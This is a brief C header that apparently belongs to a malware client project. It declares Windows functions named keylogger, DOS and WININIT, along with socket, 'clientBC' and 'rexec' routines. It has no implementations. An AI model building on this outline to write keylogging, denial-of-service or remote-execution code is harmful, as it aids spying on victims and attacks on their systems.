#ifndef CXENONh_H
#define CXENONh_H

#include "../Include/driver/socket.h"

#if defined(_WIN32)

int WININIT(void);

char* keylogger(void);
void DOS(void);

enum USTATUS
{

	ONLINE,
	OFFLINE,
	UNKNOWN

};

#endif


SOCKET client_socket(void);
int clientBC(void);
int rexec(void);

#endif